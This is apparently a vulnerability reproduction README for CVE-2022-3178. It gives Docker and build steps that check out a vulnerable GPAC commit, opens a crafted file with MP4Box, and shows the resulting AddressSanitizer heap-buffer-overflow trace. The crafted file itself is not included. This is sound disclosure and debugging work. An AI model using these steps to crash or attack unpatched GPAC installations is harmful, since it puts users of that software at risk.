### CVE-2022-3178

### PoC Links
[Huntr.dev](https://huntr.dev/bounties/f022fc50-3dfd-450a-ab47-3d75d2bf44c0/)

### Docker Container Run Command
```shell
docker build -t cve-2022-3178-poc .
docker run -itd --name CVE-2022-3178-POC cve-2022-3178-poc
docker exec -it CVE-2022-3178-POC /bin/bash
```

### PoC Reproduce Command
```shell
# Preparing the initial environment
apt-get update -y
apt-get install git -y

# Configure local SSH for Github and clone the repository. (ssh-keygen)
cd /poc
git clone git@github.com:gpac/gpac.git

# Rollback to the vulnerable version.
cd gpac/
git reset --hard fc4749f9ce8d6ddf50d1f1104366cdacede14d33

# Install the compilation and installation dependencies.
apt install gcc make zlib1g-dev pkg-config clang libtool-bin build-essential llvm-dev libunwind-dev -y

# Configure, compile, and install.
./configure --enable-sanitizer --enable-debug --static-mp4box --use-zlib=no --use-bzip=no --use-png=no --use-jpeg=no
make
make install

# Open the poc file.
MP4Box -diso /poc/poc1_hbo.dat

```

### Description
Observed that:
```shell
[isom] invalid tag size in Xtra !
[isom] not enough bytes in box Xtra: 7 left, reading 8 (file isomedia/box_code_base.c, line 12863), skipping box
[iso file] Box "Xtra" (start 24) has 7 extra bytes
[iso file] Read Box type 00000001 (0x00000001) at position 92 has size 0 but is not at root/file level. Forbidden, skipping end of parent box !
[iso file] Box "moof" (start 84) has 8 extra bytes
[iso file] Movie fragment but no moov (yet) - possibly broken parsing!
[iso file] Box "vwid" (start 204) has 5 extra bytes
[iso file] Unknown top-level box type 00000B01
[iso file] Incomplete box 00000B01 - start 264 size 34164724
[iso file] Incomplete file while reading for dump - aborting parsing
=================================================================
==22845==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xffffb15015b0 at pc 0x0000005732bc bp 0xfffff1ecfcd0 sp 0xfffff1ecfcf0
READ of size 2 at 0xffffb15015b0 thread T0
#0 0x5732bb in gf_utf8_wcslen utils/utf.c:442
#1 0xaa12d3 in xtra_box_dump isomedia/box_dump.c:6471
#2 0xaaca5f in gf_isom_box_dump isomedia/box_funcs.c:2108
#3 0xa51187 in gf_isom_dump isomedia/box_dump.c:138
#4 0x452eb3 in dump_isom_xml /poc/gpac/applications/mp4box/filedump.c:2061
#5 0x43bdcb in mp4box_main /poc/gpac/applications/mp4box/mp4box.c:6372
#6 0x43e6cb in main /poc/gpac/applications/mp4box/mp4box.c:6811
#7 0xffffb4bad8df in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x1f8df)

0xffffb15015b1 is located 0 bytes to the right of 17-byte region [0xffffb15015a0,0xffffb15015b1)
allocated by thread T0 here:
#0 0xffffb59ae19f in malloc (/usr/lib/aarch64-linux-gnu/libasan.so.2+0x9619f)
#1 0x4deb67 in gf_malloc utils/alloc.c:150
#2 0x1d6372f in xtra_box_read isomedia/box_code_base.c:12890
#3 0xaa88df in gf_isom_box_read isomedia/box_funcs.c:1860
#4 0xaa3a93 in gf_isom_box_parse_ex isomedia/box_funcs.c:271
#5 0xaa213b in gf_isom_parse_root_box isomedia/box_funcs.c:38
#6 0xad7b7b in gf_isom_parse_movie_boxes_internal isomedia/isom_intern.c:373
#7 0xadfbfb in gf_isom_parse_movie_boxes isomedia/isom_intern.c:860
#8 0xae079f in gf_isom_open_file isomedia/isom_intern.c:980
#9 0xaee537 in gf_isom_open isomedia/isom_read.c:509
#10 0x43adcb in mp4box_main /poc/gpac/applications/mp4box/mp4box.c:6181
#11 0x43e6cb in main /poc/gpac/applications/mp4box/mp4box.c:6811
#12 0xffffb4bad8df in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x1f8df)

SUMMARY: AddressSanitizer: heap-buffer-overflow utils/utf.c:442 gf_utf8_wcslen
Shadow bytes around the buggy address:
0x200ff62a0260: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff62a0270: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff62a0280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff62a0290: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff62a02a0: fa fa fd fd fd fa fa fa 00 00 00 fa fa fa 00 00
=>0x200ff62a02b0: 00 00 fa fa 00 00[01]fa fa fa fd fd fd fa fa fa
0x200ff62a02c0: 00 00 02 fa fa fa 00 00 00 07 fa fa 00 00 00 fa
0x200ff62a02d0: fa fa 00 00 04 fa fa fa 00 00 00 fa fa fa 00 00
0x200ff62a02e0: 00 fa fa fa 00 00 00 fa fa fa 00 00 00 fa fa fa
0x200ff62a02f0: 00 00 00 fa fa fa 00 00 00 fa fa fa 00 00 00 fa
0x200ff62a0300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
Addressable:           00
Partially addressable: 01 02 03 04 05 06 07
Heap left redzone:       fa
Heap right redzone:      fb
Freed heap region:       fd
Stack left redzone:      f1
Stack mid redzone:       f2
Stack right redzone:     f3
Stack partial redzone:   f4
Stack after return:      f5
Stack use after scope:   f8
Global redzone:          f9
Global init order:       f6
Poisoned by user:        f7
Container overflow:      fc
Array cookie:            ac
Intra object redzone:    bb
ASan internal:           fe
==22845==ABORTING
```



